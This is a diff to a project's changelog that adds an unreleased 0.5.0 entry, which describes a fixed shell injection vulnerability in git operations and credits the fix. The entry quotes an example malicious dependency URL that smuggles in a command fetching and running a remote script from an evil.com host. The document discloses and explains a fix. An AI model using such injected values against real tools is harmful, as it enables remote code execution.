@@ -2,6 +2,11 @@
 
 All notable changes to this project will be documented in this file.
 
+## 0.5.0 (Unreleased)
+
+### Fixed
+- **Security**: Fixed shell injection vulnerability in git operations where malicious dependency URLs could execute arbitrary commands (e.g., `https://evil.com/repo.git; curl https://evil.com/steal.sh | bash`). Replaced `execSync()` with `execFileSync()` to prevent shell interpretation of metacharacters in git URLs, branch names, tag names, and commit hashes. Thanks to @ysamlan for the fix! [#40](https://github.com/mensfeld/craftdesk/pull/40)
+
 ## 0.4.0 (2026-01-26)
 
 ### Added
